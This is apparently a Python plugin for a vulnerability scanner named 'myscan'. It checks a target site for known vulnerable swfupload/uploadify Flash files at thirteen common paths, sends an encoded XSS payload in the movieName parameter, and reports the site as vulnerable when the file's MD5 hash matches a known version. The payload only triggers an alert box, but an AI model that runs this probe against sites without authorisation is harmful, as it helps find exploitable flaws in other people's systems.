#!/usr/bin/env python3
# @Time    : 2020-05-24
# @Author  : caicai
# @File    : myscan_swf_xss.py

'''
未验证
'''
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.threads import mythread
from myscan.lib.core.common import getmd5
from myscan.lib.core.data import cmd_line_options


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "flash xss"
        self.vulmsg = "通用flash的xss"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        swffile = [
            'common/swfupload/swfupload.swf',
            'adminsoft/js/swfupload.swf',
            'statics/js/swfupload/swfupload.swf',
            'images/swfupload/swfupload.swf',
            'js/upload/swfupload/swfupload.swf',
            'addons/theme/stv1/_static/js/swfupload/swfupload.swf',
            'admin/kindeditor/plugins/multiimage/images/swfupload.swf',
            'includes/js/upload.swf',
            'js/swfupload/swfupload.swf',
            'Plus/swfupload/swfupload/swfupload.swf',
            'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf',
            'include/lib/js/uploadify/uploadify.swf',
            'lib/swf/swfupload.swf', ]

        self.md5_list = [
            '3a1c6cc728dddc258091a601f28a9c12',
            '53fef78841c3fae1ee992ae324a51620',
            '4c2fc69dc91c885837ce55d03493a5f5',
        ]
        mythread(self.test, swffile, cmd_line_options.threads)

    def test(self, swf):
        req = {
            "method": "GET",
            # payload :    "])}catch(e){if(!window.x){window.x=1;alert("xss")}}
            "url": self.url + swf + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//",
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200:
            md5_value = getmd5(r.text)
            if md5_value in self.md5_list:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
